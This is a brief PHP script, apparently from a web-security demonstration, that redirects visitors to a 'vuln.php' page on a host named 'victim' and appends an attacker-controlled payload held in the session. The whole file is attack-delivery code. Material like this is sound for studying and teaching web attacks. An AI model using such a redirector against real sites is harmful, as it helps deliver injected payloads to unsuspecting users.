<?php
session_start();

$host = 'victim.kotowicz.net';

$url = 'http://' . $host . dirname($_SERVER['REQUEST_URI']) . '/vuln.php?payload=';


header('Location: ' . $url . $_SESSION['payload']);
die();
?>
